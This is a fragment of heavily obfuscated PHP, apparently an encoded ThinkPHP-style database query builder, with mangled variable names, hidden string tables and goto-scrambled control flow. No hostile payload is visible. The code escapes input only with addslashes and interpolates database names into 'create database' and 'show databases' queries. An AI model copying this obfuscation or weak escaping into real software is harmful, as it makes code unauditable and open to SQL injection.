$c¬ŒáÑôïÀ) . $b§¨‡ä‚©Ê[819]; } $D¹Û²ğáä¦ .= implode($b§¨‡ä‚©Ê[925], $B±‹›·Ş¡); } elseif (strpos($EİòŠ¸——¦, $b§¨‡ä‚©Ê[272])) { $B‚ÊË¹œµõ = explode($b§¨‡ä‚©Ê[272], $EİòŠ¸——¦); $B±‹›·Ş¡ = array(); foreach ($B‚ÊË¹œµõ as $e²íª‡‘£… => $d¥Ş•¼ß—) { $c¬ŒáÑôïÀ = $f¨é‘¼˜ ? $bÆß¹ô‰[$e²íª‡‘£…] : $bÆß¹ô‰; $B±‹›·Ş¡[] = $b§¨‡ä‚©Ê[248] . $this->parseWhereItem($this->parseKey($d¥Ş•¼ß—), $c¬ŒáÑôïÀ) . $b§¨‡ä‚©Ê[819]; } $D¹Û²ğáä¦ .= implode($b§¨‡ä‚©Ê[920], $B±‹›·Ş¡); } else { $D¹Û²ğáä¦ .= $this->parseWhereItem($this->parseKey($EİòŠ¸——¦), $bÆß¹ô‰); } } $D¹Û²ğáä¦ .= $b§¨‡ä‚©Ê[266] . $Bî•¦ß‚÷²; } $D¹Û²ğáä¦ = substr($D¹Û²ğáä¦, 0, -strlen($Bî•¦ß‚÷²)); } return empty($D¹Û²ğáä¦) ? $b§¨‡ä‚©Ê[33] : $b§¨‡ä‚©Ê[926] . $D¹Û²ğáä¦; } protected function parseWhereItem($f‘øÜ ¾ğ“, $c˜ƒ•ÂÕ‰) { $Cœ‚í—ø³ =& $_SERVER[”Ì÷ñ­î¸]; $D¶ÍÎáÆçß = $Cœ‚í—ø³[33]; if (is_array($c˜ƒ•ÂÕ‰)) { if (is_string($c˜ƒ•ÂÕ‰[0])) { $cñ±Â­°Ø = strtolower($c˜ƒ•ÂÕ‰[0]); if (in_array($c˜ƒ•ÂÕ‰[0], array($Cœ‚í—ø³[909], $Cœ‚í—ø³[927], $Cœ‚í—ø³[928], $Cœ‚í—ø³[929], $Cœ‚í—ø³[930], $Cœ‚í—ø³[931]))) { $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $c˜ƒ•ÂÕ‰[0] . $Cœ‚í—ø³[50] . $this->parseValue($c˜ƒ•ÂÕ‰[1]); } elseif (preg_match($Cœ‚í—ø³[932], $c˜ƒ•ÂÕ‰[0])) { $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[50] . $this->parseValue($c˜ƒ•ÂÕ‰[1]); } elseif (preg_match($Cœ‚í—ø³[933], $c˜ƒ•ÂÕ‰[0])) { if (is_array($c˜ƒ•ÂÕ‰[1])) { $bÇ¢ØÄÆåˆ = isset($c˜ƒ•ÂÕ‰[2]) ? strtoupper($c˜ƒ•ÂÕ‰[2]) : $Cœ‚í—ø³[918]; if (in_array($bÇ¢ØÄÆåˆ, array($Cœ‚í—ø³[917], $Cœ‚í—ø³[918], $Cœ‚í—ø³[919]))) { $f¡øÏ ›¡ = array(); foreach ($c˜ƒ•ÂÕ‰[1] as $FÌæª·ªŒ) { $f¡øÏ ›¡[] = $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[50] . $this->parseValue($FÌæª·ªŒ); } $D¶ÍÎáÆçß .= $Cœ‚í—ø³[248] . implode($Cœ‚í—ø³[50] . $bÇ¢ØÄÆåˆ . $Cœ‚í—ø³[50], $f¡øÏ ›¡) . $Cœ‚í—ø³[819]; } } else { $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[50] . $this->parseValue($c˜ƒ•ÂÕ‰[1]); } } elseif ($Cœ‚í—ø³[285] == $cñ±Â­°Ø) { $D¶ÍÎáÆçß .= $Cœ‚í—ø³[817] . $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $c˜ƒ•ÂÕ‰[1] . $Cœ‚í—ø³[934]; } elseif (preg_match($Cœ‚í—ø³[935], $c˜ƒ•ÂÕ‰[0])) { if (isset($c˜ƒ•ÂÕ‰[2]) && $Cœ‚í—ø³[285] == $c˜ƒ•ÂÕ‰[2]) { $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[50] . $c˜ƒ•ÂÕ‰[1]; } else { if (is_string($c˜ƒ•ÂÕ‰[1])) { $c˜ƒ•ÂÕ‰[1] = explode($Cœ‚í—ø³[47], $c˜ƒ•ÂÕ‰[1]); } $døŒ…èÃì© = implode($Cœ‚í—ø³[47], $this->parseValue($c˜ƒ•ÂÕ‰[1])); $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[817] . $døŒ…èÃì© . $Cœ‚í—ø³[819]; } } elseif (preg_match($Cœ‚í—ø³[936], $c˜ƒ•ÂÕ‰[0])) { $eŞİ›éÉ‡ = is_string($c˜ƒ•ÂÕ‰[1]) ? explode($Cœ‚í—ø³[47], $c˜ƒ•ÂÕ‰[1]) : $c˜ƒ•ÂÕ‰[1]; $D¶ÍÎáÆçß .= $Cœ‚í—ø³[817] . $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $this->exp[$cñ±Â­°Ø] . $Cœ‚í—ø³[50] . $this->parseValue($eŞİ›éÉ‡[0]) . $Cœ‚í—ø³[920] . $this->parseValue($eŞİ›éÉ‡[1]) . $Cœ‚í—ø³[266]; } else { think_exception(think_lang($Cœ‚í—ø³[923]) . $Cœ‚í—ø³[4] . $c˜ƒ•ÂÕ‰[0]); } } else { $cì¥ì—„ïØ = count($c˜ƒ•ÂÕ‰); $DáÏõ¦Áì = isset($c˜ƒ•ÂÕ‰[$cì¥ì—„ïØ - 1]) ? strtoupper($c˜ƒ•ÂÕ‰[$cì¥ì—„ïØ - 1]) : $Cœ‚í—ø³[33]; if (in_array($DáÏõ¦Áì, array($Cœ‚í—ø³[917], $Cœ‚í—ø³[918], $Cœ‚í—ø³[919]))) { $cì¥ì—„ïØ = $cì¥ì—„ïØ - 1; } else { $DáÏõ¦Áì = $Cœ‚í—ø³[917]; } for ($b¬Ø‹š‘¤ï = 0; $b¬Ø‹š‘¤ï < $cì¥ì—„ïØ; $b¬Ø‹š‘¤ï++) { $eŞİ›éÉ‡ = is_array($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï]) ? $c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï][1] : $c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï]; if ($Cœ‚í—ø³[285] == strtolower($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï][0])) { $D¶ÍÎáÆçß .= $Cœ‚í—ø³[248] . $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $eŞİ›éÉ‡ . $Cœ‚í—ø³[934] . $DáÏõ¦Áì . $Cœ‚í—ø³[50]; } else { $E‘´ƒ„ÄÖí = is_array($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï]) ? $this->exp[strtolower($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï][0])] : $Cœ‚í—ø³[909]; if (!$E‘´ƒ„ÄÖí && is_array($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï]) && in_array($c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï][0], array($Cœ‚í—ø³[909], $Cœ‚í—ø³[927], $Cœ‚í—ø³[928], $Cœ‚í—ø³[929], $Cœ‚í—ø³[930], $Cœ‚í—ø³[931]))) { $E‘´ƒ„ÄÖí = $c˜ƒ•ÂÕ‰[$b¬Ø‹š‘¤ï][0]; } $D¶ÍÎáÆçß .= $Cœ‚í—ø³[248] . $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[50] . $E‘´ƒ„ÄÖí . $Cœ‚í—ø³[50] . $this->parseValue($eŞİ›éÉ‡) . $Cœ‚í—ø³[934] . $DáÏõ¦Áì . $Cœ‚í—ø³[50]; } } $D¶ÍÎáÆçß = substr($D¶ÍÎáÆçß, 0, -4); } } else { $D¶ÍÎáÆçß .= $f‘øÜ ¾ğ“ . $Cœ‚í—ø³[937] . $this->parseValue($c˜ƒ•ÂÕ‰); } return $D¶ÍÎáÆçß; } protected function parseThinkWhere($e¤ä‰Ï¼×Í, $CäßØÛôŠï) { $bĞ×÷†±¾™ =& $_SERVER[”Ì÷ñ­î¸]; $DØ„¾Š¶ = $bĞ×÷†±¾™[33]; switch ($e¤ä‰Ï¼×Í) { case $bĞ×÷†±¾™[339]: $DØ„¾Š¶ = $CäßØÛôŠï; break; case $bĞ×÷†±¾™[921]: $DØ„¾Š¶ = is_string($CäßØÛôŠï) ? $CäßØÛôŠï : substr($this->parseWhere($CäßØÛôŠï), 6); break; case $bĞ×÷†±¾™[938]: parse_str($CäßØÛôŠï, $a§µ‹¨®™è); if (isset($a§µ‹¨®™è[$bĞ×÷†±¾™[916]])) { $F¯õËğ° = $bĞ×÷†±¾™[50] . strtoupper($a§µ‹¨®™è[$bĞ×÷†±¾™[916]]) . $bĞ×÷†±¾™[50]; unset($a§µ‹¨®™è[$bĞ×÷†±¾™[916]]); } else { $F¯õËğ° = $bĞ×÷†±¾™[920]; } $b‹•Ş½ÇŠŒ = array(); foreach ($a§µ‹¨®™è as $aŠ¹˜´ŒÈ => $Fˆ…¢í) { $b‹•Ş½ÇŠŒ[] = $this->parseKey($aŠ¹˜´ŒÈ) . $bĞ×÷†±¾™[937] . $this->parseValue($Fˆ…¢í); } $DØ„¾Š¶ = implode($F¯õËğ°, $b‹•Ş½ÇŠŒ); break; } return $DØ„¾Š¶; } protected function parseLimit($Eãáˆ™™í¾) { $eŒ›¥‚“ô =& $_SERVER[”Ì÷ñ­î¸]; return !empty($Eãáˆ™™í¾) ? $eŒ›¥‚“ô[48] . $Eãáˆ™™í¾ . $eŒ›¥‚“ô[50] : $eŒ›¥‚“ô[33]; } protected function parseJoin($Cç•ğö×©) { $cµ÷´ÃËÄ´ =& $_SERVER[”Ì÷ñ­î¸]; $aÂ‘”‡Å¶Ê = $cµ÷´ÃËÄ´[33]; if (!empty($Cç•ğö×©)) { if (is_array($Cç•ğö×©)) { foreach ($Cç•ğö×© as $då†ÙÅ‡¨÷ => $D®”·‘À¤À) { if (!1 !== stripos($D®”·‘À¤À, $cµ÷´ÃËÄ´[939])) { $aÂ‘”‡Å¶Ê .= $cµ÷´ÃËÄ´[50] . $D®”·‘À¤À; } else { $aÂ‘”‡Å¶Ê .= $cµ÷´ÃËÄ´[940] . $D®”·‘À¤À; } } } else { $aÂ‘”‡Å¶Ê .= $cµ÷´ÃËÄ´[940] . $Cç•ğö×©; } } $aÂ‘”‡Å¶Ê = preg_replace($cµ÷´ÃËÄ´[941], think_config($cµ÷´ÃËÄ´[844]) . $cµ÷´ÃËÄ´[942], $aÂ‘”‡Å¶Ê); return $aÂ‘”‡Å¶Ê; } protected function parseOrder($dó®§Û›­‡) { $Fã¼ƒ‘ä± =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($dó®§Û›­‡)) { $cğ‚õ¡ìöæ = array(); foreach ($dó®§Û›­‡ as $B§±é¾°„ => $A­É‘õ£ôÚ) { if (is_numeric($B§±é¾°„)) { $cğ‚õ¡ìöæ[] = $this->parseKey($A­É‘õ£ôÚ); } else { $A­É‘õ£ôÚ = in_array(strtoupper(trim($A­É‘õ£ôÚ)), array($Fã¼ƒ‘ä±[943], $Fã¼ƒ‘ä±[944])) ? $Fã¼ƒ‘ä±[50] . $A­É‘õ£ôÚ : $Fã¼ƒ‘ä±[33]; if (preg_match($Fã¼ƒ‘ä±[945], $B§±é¾°„)) { $cğ‚õ¡ìöæ[] = $this->parseKey($B§±é¾°„) . $A­É‘õ£ôÚ; } else { think_exception($Fã¼ƒ‘ä±[946] . $B§±é¾°„); } } } $dó®§Û›­‡ = implode($Fã¼ƒ‘ä±[47], $cğ‚õ¡ìöæ); } return !empty($dó®§Û›­‡) ? $Fã¼ƒ‘ä±[947] . $dó®§Û›­‡ : $Fã¼ƒ‘ä±[33]; } protected function parseGroup($AÎ–†ÉŒŞ) { $FŠòÙóš =& $_SERVER[”Ì÷ñ­î¸]; return !empty($AÎ–†ÉŒŞ) ? $FŠòÙóš[948] . $AÎ–†ÉŒŞ : $FŠòÙóš[33]; } protected function parseHaving($fê’ö• Ò) { $d™Ù«Ë´­ =& $_SERVER[”Ì÷ñ­î¸]; return !empty($fê’ö• Ò) ? $d™Ù«Ë´­[949] . $fê’ö• Ò : $d™Ù«Ë´­[33]; } protected function parseComment($cÑäÅ‚ Ç‚) { $cˆİäËÎô =& $_SERVER[”Ì÷ñ­î¸]; return !empty($cÑäÅ‚ Ç‚) ? $cˆİäËÎô[950] . $cÑäÅ‚ Ç‚ . $cˆİäËÎô[951] : $cˆİäËÎô[33]; } protected function parseDistinct($fƒœÓ›£ª÷) { $EŞ¶êÒ¤¹– =& $_SERVER[”Ì÷ñ­î¸]; return !empty($fƒœÓ›£ª÷) ? $EŞ¶êÒ¤¹–[952] : $EŞ¶êÒ¤¹–[33]; } protected function parseUnion($D¹½Šñ„İ¡) { $FÙ„ÅòàÑì =& $_SERVER[”Ì÷ñ­î¸]; if (empty($D¹½Šñ„İ¡)) { return $FÙ„ÅòàÑì[33]; } if (isset($D¹½Šñ„İ¡[$FÙ„ÅòàÑì[336]])) { $aÃàİ¨íÓÁ = $FÙ„ÅòàÑì[953]; unset($D¹½Šñ„İ¡[$FÙ„ÅòàÑì[336]]); } else { $aÃàİ¨íÓÁ = $FÙ„ÅòàÑì[954]; } foreach ($D¹½Šñ„İ¡ as $fíßã¨©Ö) { $Bà¤µ­ˆÛŒ[] = $aÃàİ¨íÓÁ . (is_array($fíßã¨©Ö) ? $this->buildSelectSql($fíßã¨©Ö) : $fíßã¨©Ö); } return implode($FÙ„ÅòàÑì[50], $Bà¤µ­ˆÛŒ); } public function insert($aõòŸçÖÏÄ, $AÈîŠò´²º = array(), $c¤Ú¥ßŞáÇ = false) { goto FÚ¤ªğ­©; BÇÙ êêÃ: $DÓÎîŞƒµ .= $this->parseComment(!empty($AÈîŠò´²º[$bÉô¼Ñ±Ã[341]]) ? $AÈîŠò´²º[$bÉô¼Ñ±Ã[341]] : $bÉô¼Ñ±Ã[33]); return $this->execute($DÓÎîŞƒµ, $this->parseBind(!empty($AÈîŠò´²º[$bÉô¼Ñ±Ã[273]]) ? $AÈîŠò´²º[$bÉô¼Ñ±Ã[273]] : array())); goto c«˜í¿‡õƒ; a°Ôê««¿—: foreach ($aõòŸçÖÏÄ as $DÄÕ°ó => $dˆ†“ìêâ) { if (is_array($dˆ†“ìêâ) && $bÉô¼Ñ±Ã[285] == $dˆ†“ìêâ[0]) { $E³©°‘Ï÷÷[] = $this->parseKey($DÄÕ°ó); $bÙŠÖ°ÔõÉ[] = $dˆ†“ìêâ[1]; } elseif (is_scalar($dˆ†“ìêâ) || is_null($dˆ†“ìêâ)) { $E³©°‘Ï÷÷[] = $this->parseKey($DÄÕ°ó); $bÙŠÖ°ÔõÉ[] = $this->parseValue($dˆ†“ìêâ); } } $DÓÎîŞƒµ = ($c¤Ú¥ßŞáÇ ? $bÉô¼Ñ±Ã[821] : $bÉô¼Ñ±Ã[822]) . $bÉô¼Ñ±Ã[823] . $this->parseTable($AÈîŠò´²º[$bÉô¼Ñ±Ã[267]]) . $bÉô¼Ñ±Ã[817] . implode($bÉô¼Ñ±Ã[47], $E³©°‘Ï÷÷) . $bÉô¼Ñ±Ã[818] . implode($bÉô¼Ñ±Ã[47], $bÙŠÖ°ÔõÉ) . $bÉô¼Ñ±Ã[819]; $DÓÎîŞƒµ .= $this->parseLock(isset($AÈîŠò´²º[$bÉô¼Ñ±Ã[772]]) ? $AÈîŠò´²º[$bÉô¼Ñ±Ã[772]] : !1); goto BÇÙ êêÃ; FÚ¤ªğ­©: $bÉô¼Ñ±Ã =& $_SERVER[”Ì÷ñ­î¸]; $bÙŠÖ°ÔõÉ = $E³©°‘Ï÷÷ = array(); $this->model = $AÈîŠò´²º[$bÉô¼Ñ±Ã[269]]; goto a°Ôê««¿—; c«˜í¿‡õƒ: } public function selectInsert($dô±Æß•¦, $fİÄŠĞé¬«, $Bœ•ø‘“¸Ğ = array()) { goto fŞ×øÒá³°; c³÷ßÎ«: return $this->execute($fƒÍŒÜïòŒ, $this->parseBind(!empty($Bœ•ø‘“¸Ğ[$b„ÃÙØ‹¢[273]]) ? $Bœ•ø‘“¸Ğ[$b„ÃÙØ‹¢[273]] : array())); goto CÇ·˜º‘; bƒ°ÖŒÒô±: array_walk($dô±Æß•¦, array($this, $b„ÃÙØ‹¢[820])); $fƒÍŒÜïòŒ = $b„ÃÙØ‹¢[955] . $this->parseTable($fİÄŠĞé¬«) . $b„ÃÙØ‹¢[817] . implode($b„ÃÙØ‹¢[47], $dô±Æß•¦) . $b„ÃÙØ‹¢[934]; $fƒÍŒÜïòŒ .= $this->buildSelectSql($Bœ•ø‘“¸Ğ); goto c³÷ßÎ«; fŞ×øÒá³°: $b„ÃÙØ‹¢ =& $_SERVER[”Ì÷ñ­î¸]; $this->model = $Bœ•ø‘“¸Ğ[$b„ÃÙØ‹¢[269]]; if (is_string($dô±Æß•¦)) { $dô±Æß•¦ = explode($b„ÃÙØ‹¢[47], $dô±Æß•¦); } goto bƒ°ÖŒÒô±; CÇ·˜º‘: } public function update($d™ùªòÔÏ†, $fôå‡ºˆà«) { $AÅ³·‹‡Ô³ =& $_SERVER[”Ì÷ñ­î¸]; $this->model = $fôå‡ºˆà«[$AÅ³·‹‡Ô³[269]]; $bŞô§¢Î³ = $AÅ³·‹‡Ô³[956] . $this->parseTable($fôå‡ºˆà«[$AÅ³·‹‡Ô³[267]]) . $this->parseSet($d™ùªòÔÏ†) . $this->parseWhere(!empty($fôå‡ºˆà«[$AÅ³·‹‡Ô³[263]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[263]] : $AÅ³·‹‡Ô³[33]) . $this->parseOrder(!empty($fôå‡ºˆà«[$AÅ³·‹‡Ô³[350]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[350]] : $AÅ³·‹‡Ô³[33]) . $this->parseLimit(!empty($fôå‡ºˆà«[$AÅ³·‹‡Ô³[280]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[280]] : $AÅ³·‹‡Ô³[33]) . $this->parseLock(isset($fôå‡ºˆà«[$AÅ³·‹‡Ô³[772]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[772]] : !1) . $this->parseComment(!empty($fôå‡ºˆà«[$AÅ³·‹‡Ô³[341]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[341]] : $AÅ³·‹‡Ô³[33]); return $this->execute($bŞô§¢Î³, $this->parseBind(!empty($fôå‡ºˆà«[$AÅ³·‹‡Ô³[273]]) ? $fôå‡ºˆà«[$AÅ³·‹‡Ô³[273]] : array())); } public function delete($aèÙœ¬…ò´ = array()) { $Cæ•­è”‘œ =& $_SERVER[”Ì÷ñ­î¸]; $this->model = $aèÙœ¬…ò´[$Cæ•­è”‘œ[269]]; $bôµƒÔã³Ó = $Cæ•­è”‘œ[957] . $this->parseTable($aèÙœ¬…ò´[$Cæ•­è”‘œ[267]]) . $this->parseWhere(!empty($aèÙœ¬…ò´[$Cæ•­è”‘œ[263]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[263]] : $Cæ•­è”‘œ[33]) . $this->parseOrder(!empty($aèÙœ¬…ò´[$Cæ•­è”‘œ[350]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[350]] : $Cæ•­è”‘œ[33]) . $this->parseLimit(!empty($aèÙœ¬…ò´[$Cæ•­è”‘œ[280]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[280]] : $Cæ•­è”‘œ[33]) . $this->parseLock(isset($aèÙœ¬…ò´[$Cæ•­è”‘œ[772]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[772]] : !1) . $this->parseComment(!empty($aèÙœ¬…ò´[$Cæ•­è”‘œ[341]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[341]] : $Cæ•­è”‘œ[33]); return $this->execute($bôµƒÔã³Ó, $this->parseBind(!empty($aèÙœ¬…ò´[$Cæ•­è”‘œ[273]]) ? $aèÙœ¬…ò´[$Cæ•­è”‘œ[273]] : array())); } public function select($cöÃ§Õ‡Ç‚ = array()) { goto f«í™í‡’—; f«í™í‡’—: $cà§“äİ =& $_SERVER[”Ì÷ñ­î¸]; $this->model = $cöÃ§Õ‡Ç‚[$cà§“äİ[269]]; $dö÷¿ŒòÛÊ = $this->buildSelectSql($cöÃ§Õ‡Ç‚); goto fÓòïİ‰ë; b®®¬ëî¼È: if ($C¹Ñ¹¬Å·º && !1 !== $c¢ˆ¨‘çÃø) { think_cache($Eã¢ˆÙïÖ¼, $c¢ˆ¨‘çÃø, $C¹Ñ¹¬Å·º); } return $c¢ˆ¨‘çÃø; goto f‡áŞˆÖŒº; fÓòïİ‰ë: $C¹Ñ¹¬Å·º = isset($cöÃ§Õ‡Ç‚[$cà§“äİ[337]]) ? $cöÃ§Õ‡Ç‚[$cà§“äİ[337]] : !1; if ($C¹Ñ¹¬Å·º) { $Eã¢ˆÙïÖ¼ = is_string($C¹Ñ¹¬Å·º[$cà§“äİ[89]]) ? $C¹Ñ¹¬Å·º[$cà§“äİ[89]] : $cà§“äİ[958] . md5($dö÷¿ŒòÛÊ); $dìä®äÙÔ = think_cache($Eã¢ˆÙïÖ¼, $cà§“äİ[33], $C¹Ñ¹¬Å·º); if (!1 !== $dìä®äÙÔ) { return $dìä®äÙÔ; } } $c¢ˆ¨‘çÃø = $this->query($dö÷¿ŒòÛÊ, $this->parseBind(!empty($cöÃ§Õ‡Ç‚[$cà§“äİ[273]]) ? $cöÃ§Õ‡Ç‚[$cà§“äİ[273]] : array())); goto b®®¬ëî¼È; f‡áŞˆÖŒº: } public function buildSelectSql($Bù…õ¨¾ = array()) { goto E¶‹…‰¤¢¨; E¶‹…‰¤¢¨: $eèÒ¿‰¥ªÄ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($Bù…õ¨¾[$eèÒ¿‰¥ªÄ[340]])) { if (strpos($Bù…õ¨¾[$eèÒ¿‰¥ªÄ[340]], $eèÒ¿‰¥ªÄ[47])) { list($dä²åÔØ¦õ, $AßÅì¯¥¡) = explode($eèÒ¿‰¥ªÄ[47], $Bù…õ¨¾[$eèÒ¿‰¥ªÄ[340]]); } else { $dä²åÔØ¦õ = $Bù…õ¨¾[$eèÒ¿‰¥ªÄ[340]]; } $dä²åÔØ¦õ = $dä²åÔØ¦õ ? $dä²åÔØ¦õ : 1; $AßÅì¯¥¡ = isset($AßÅì¯¥¡) ? $AßÅì¯¥¡ : (is_numeric($Bù…õ¨¾[$eèÒ¿‰¥ªÄ[280]]) ? $Bù…õ¨¾[$eèÒ¿‰¥ªÄ[280]] : 20); $fÚÅÑ¡Ñ  = $AßÅì¯¥¡ * ((int) $dä²åÔØ¦õ - 1); $Bù…õ¨¾[$eèÒ¿‰¥ªÄ[280]] = $fÚÅÑ¡Ñ  . $eèÒ¿‰¥ªÄ[47] . $AßÅì¯¥¡; } if (think_config($eèÒ¿‰¥ªÄ[959])) { $bàÎØÜ¾» = $eèÒ¿‰¥ªÄ[960] . md5(serialize($Bù…õ¨¾)); $aÚ¸„òí¢˜ = think_cache($bàÎØÜ¾»); if ($aÚ¸„òí¢˜) { return $aÚ¸„òí¢˜; } } goto f‹ØŠ©¼ÊÇ; c¿ƒï‡³‚: return $AÊ°§õÎ¬®; goto Fãì¥‚’Ô; f‹ØŠ©¼ÊÇ: $AÊ°§õÎ¬® = $this->parseSql($this->selectSql, $Bù…õ¨¾); $AÊ°§õÎ¬® .= $this->parseLock(isset($Bù…õ¨¾[$eèÒ¿‰¥ªÄ[772]]) ? $Bù…õ¨¾[$eèÒ¿‰¥ªÄ[772]] : !1); if (isset($bàÎØÜ¾»)) { think_cache($bàÎØÜ¾», $AÊ°§õÎ¬®); } goto c¿ƒï‡³‚; Fãì¥‚’Ô: } public function parseSql($d„‘á†å·«, $eªõ«íëÅè = array()) { $B³¶‚†¤Î‘ =& $_SERVER[”Ì÷ñ­î¸]; $d„‘á†å·« = str_replace(array($B³¶‚†¤Î‘[961], $B³¶‚†¤Î‘[962], $B³¶‚†¤Î‘[963], $B³¶‚†¤Î‘[964], $B³¶‚†¤Î‘[965], $B³¶‚†¤Î‘[966], $B³¶‚†¤Î‘[967], $B³¶‚†¤Î‘[968], $B³¶‚†¤Î‘[969], $B³¶‚†¤Î‘[970], $B³¶‚†¤Î‘[971]), array($this->parseTable("{$eªõ«íëÅè[$B³¶‚†¤Î‘[267]]}"), $this->parseDistinct(isset($eªõ«íëÅè[$B³¶‚†¤Î‘[972]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[972]] : !1), $this->parseField(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[261]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[261]] : $B³¶‚†¤Î‘[176]), $this->parseJoin(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[270]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[270]] : $B³¶‚†¤Î‘[33]), $this->parseWhere(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[263]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[263]] : $B³¶‚†¤Î‘[33]), $this->parseGroup(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[973]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[973]] : $B³¶‚†¤Î‘[33]), $this->parseHaving(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[974]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[974]] : $B³¶‚†¤Î‘[33]), $this->parseOrder(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[350]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[350]] : $B³¶‚†¤Î‘[33]), $this->parseLimit(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[280]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[280]] : $B³¶‚†¤Î‘[33]), $this->parseUnion(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[335]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[335]] : $B³¶‚†¤Î‘[33]), $this->parseComment(!empty($eªõ«íëÅè[$B³¶‚†¤Î‘[341]]) ? $eªõ«íëÅè[$B³¶‚†¤Î‘[341]] : $B³¶‚†¤Î‘[33])), $d„‘á†å·«); return $d„‘á†å·«; } public function getLastSql($b÷ï¬ï·ğ† = '') { return $b÷ï¬ï·ğ† ? $this->modelSql[$b÷ï¬ï·ğ†] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($eçõÕëÔŒØ) { return addslashes($eçõÕëÔŒØ); } public function setModel($C§‰ÇáõÇá) { $this->model = $C§‰ÇáõÇá; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($AÄÕÉ¿èì, $E˜ì‡Á”¥ì = '') { $this->database = $AÄÕÉ¿èì; $this->type = $E˜ì‡Á”¥ì; } public function model($E²µ —–±İ = '') { return new ModelBase($E²µ —–±İ, $_SERVER[”Ì÷ñ­î¸][33], $this->database); } public function db($b©¸†÷Æ¶ˆ = false) { goto fù½ô“‘…; BÑ®Òğ„‘‚: $Aè›êñ Û = $cËæØ¨Ÿ[$a¢¿±‰ƒá™[887]]; $cËæØ¨Ÿ[$a¢¿±‰ƒá™[887]] = $a¢¿±‰ƒá™[33]; if ($cËæØ¨Ÿ[$a¢¿±‰ƒá™[724]] == $a¢¿±‰ƒá™[725]) { $a…îßÈœàË = $cËæØ¨Ÿ[$a¢¿±‰ƒá™[726]]; $cËæØ¨Ÿ[$a¢¿±‰ƒá™[726]] = substr($a…îßÈœàË, 0, strrpos($a…îßÈœàË, $a¢¿±‰ƒá™[975])); } goto bêä†¼ëØÔ; FÖŸîòÎ­Ş: if (!$C¨‘ÚªÇ‡) { $EœôÀ®ˆÏÒ->execute("\143\x72\145\141\x74\145\40\x64\x61\164\141\x62\x61\x73\x65\x20\140{$Aè›êñ Û}\x60"); } $cËæØ¨Ÿ[$a¢¿±‰ƒá™[887]] = $Aè›êñ Û; if ($cËæØ¨Ÿ[$a¢¿±‰ƒá™[724]] == $a¢¿±‰ƒá™[725]) { $cËæØ¨Ÿ[$a¢¿±‰ƒá™[726]] .= $a¢¿±‰ƒá™[975] . $Aè›êñ Û; } goto eˆíå¾çò¿; bêä†¼ëØÔ: $this->database = $cËæØ¨Ÿ; $EœôÀ®ˆÏÒ = $this->model()->db(); try { $C¨‘ÚªÇ‡ = $EœôÀ®ˆÏÒ->execute("\163\x68\x6f\167\x20\x64\141\x74\x61\142\x61\163\145\163\x20\154\151\x6b\x65\40\x27{$Aè›êñ Û}\47"); } catch (Exception $DÒ“¢³×İ) { } goto FÖŸîòÎ­Ş; fù½ô“‘…: $a¢¿±‰ƒá™ =& $_SERVER[”Ì÷ñ­î¸]; $cËæØ¨Ÿ = array_change_key_case($this->database); if ($this->type == $a¢¿±‰ƒá™[9] || !$b©¸†÷Æ¶ˆ) { return $this->model()->db(); } goto BÑ®Òğ„‘‚; eˆíå¾çò¿: $this->database = $cËæØ¨Ÿ; 